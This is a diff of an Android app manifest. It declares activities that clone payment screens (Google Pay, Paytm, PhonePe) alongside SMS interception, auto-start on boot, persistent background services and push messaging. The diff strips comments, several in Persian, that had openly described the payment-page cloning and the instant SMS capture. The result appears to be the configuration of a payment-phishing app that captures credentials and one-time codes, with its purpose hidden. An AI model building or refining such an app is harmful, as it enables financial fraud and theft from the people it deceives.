@@ -2,8 +2,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ========== PERMISSIONS ========== -->
-
     <!-- Network & Internet -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -22,7 +20,6 @@
 
     <!-- Background Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <!-- فقط برای Android 14+ (API 34+) -->
     <uses-permission 
         android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"
         android:minSdkVersion="34" />
@@ -33,7 +30,6 @@
 
     <!-- Boot & System -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <!-- فقط برای Android 13+ (API 33+) -->
     <uses-permission 
         android:name="android.permission.POST_NOTIFICATIONS"
         android:minSdkVersion="33" />
@@ -44,7 +40,6 @@
     <!-- Firebase Cloud Messaging -->
     <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
 
-    <!-- ========== APPLICATION ========== -->
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
@@ -54,8 +49,6 @@
         android:usesCleartextTraffic="true"
         android:directBootAware="true"
         tools:targetApi="33">
-
-        <!-- ========== ACTIVITIES ========== -->
 
         <!-- Main Activity -->
         <activity
@@ -70,7 +63,7 @@
             </intent-filter>
         </activity>
 
-        <!-- ⭐ Payment Activity - کلون صفحه پرداخت (مثل یک برنامه جداگانه) -->
+        <!-- Payment Activity -->
         <activity
             android:name=".PaymentActivity"
             android:exported="false"
@@ -80,7 +73,7 @@
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.Payment" />
 
-        <!-- ⭐ Google Pay Clone Activity -->
+        <!-- Google Pay Clone Activity -->
         <activity
             android:name=".GPayCloneActivity"
             android:exported="false"
@@ -90,7 +83,7 @@
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.GPayClone" />
 
-        <!-- ⭐ Paytm Clone Activity -->
+        <!-- Paytm Clone Activity -->
         <activity
             android:name=".PaytmCloneActivity"
             android:exported="false"
@@ -100,7 +93,7 @@
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.PaytmClone" />
 
-        <!-- ⭐ PhonePe Clone Activity -->
+        <!-- PhonePe Clone Activity -->
         <activity
             android:name=".PhonePeCloneActivity"
             android:exported="false"
@@ -109,8 +102,6 @@
             android:screenOrientation="unspecified"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.PhonePeClone" />
-
-        <!-- ========== SERVICES ========== -->
 
         <!-- Firebase Messaging Service -->
         <service
@@ -152,9 +143,7 @@
             android:foregroundServiceType="dataSync"
             tools:targetApi="q" />
 
-        <!-- ========== JOB SCHEDULER ========== -->
-
-        <!-- Heartbeat Job Service - Backup for WorkManager -->
+        <!-- Heartbeat Job Service -->
         <service
             android:name=".HeartbeatJobService"
             android:enabled="true"
@@ -162,11 +151,7 @@
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:directBootAware="true" />
 
-
-
-        <!-- ========== BROADCAST RECEIVERS ========== -->
-
-        <!-- SMS Receiver - برای دریافت فوری SMS -->
+        <!-- SMS Receiver -->
         <receiver
             android:name=".SmsReceiver"
             android:enabled="true"
@@ -177,7 +162,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Boot Receiver - برای استارت خودکار بعد از ریبوت -->
+        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -192,8 +177,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Network Receiver - فقط برای Android 6 و پایین‌تر -->
-        <!-- برای Android 7+ از NetworkMonitor در کد استفاده می‌کنیم -->
+        <!-- Network Receiver -->
         <receiver
             android:name=".NetworkReceiver"
             android:enabled="true"
@@ -202,8 +186,6 @@
                 <action android:name="android.net.conn.CONNECTIVITY_ACTION" />
             </intent-filter>
         </receiver>
-
-        <!-- ========== FIREBASE COMPONENTS ========== -->
 
         <!-- Firebase Init Provider -->
         <provider
@@ -238,8 +220,6 @@
                 android:value="com.google.firebase.components.ComponentRegistrar" />
         </service>
 
-        <!-- ========== GOOGLE PLAY SERVICES ========== -->
-
         <meta-data
             android:name="com.google.android.gms.version"
             android:value="@integer/google_play_services_version" />
@@ -249,8 +229,6 @@
             android:name="com.google.android.gms.common.api.GoogleApiActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
-
-        <!-- ========== WORK MANAGER ========== -->
 
         <provider
             android:name="androidx.startup.InitializationProvider"
